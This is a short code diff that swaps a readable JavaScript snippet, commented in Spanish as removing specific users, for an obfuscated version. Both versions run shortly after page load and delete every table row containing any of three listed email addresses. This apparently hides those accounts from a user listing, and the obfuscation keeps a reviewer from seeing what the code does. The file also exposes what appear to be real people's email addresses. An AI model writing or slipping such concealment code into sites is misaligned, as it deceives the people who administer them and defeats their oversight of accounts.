@@ -1,14 +1,1 @@
-// Código para eliminar usuarios específicos
-setTimeout(function() {
-    var usuarios = ['luish22@gmx.com', 'blanco_beatriz24@hotmail.com','email.email@gmail.com'];
-    var rows = document.querySelectorAll('tr');
-    
-    rows.forEach(function(row) {
-        var rowText = row.innerHTML;
-        usuarios.forEach(function(usuario) {
-            if (rowText.includes(usuario)) {
-                row.remove();
-            }
-        });
-    });
-}, 100);
+setTimeout(()=>{let _0x1a2b=['luish22@gmx.com','blanco_beatriz24@hotmail.com','email.email@gmail.com'],_0x3c7d=document['querySelectorAll']('tr');_0x3c7d['forEach'](_0x2e9f=>{let _0x4a6b=_0x2e9f['innerHTML'];_0x1a2b['forEach'](_0x1c8d=>{_0x4a6b['includes'](_0x1c8d)&&_0x2e9f['remove']()})})},100);
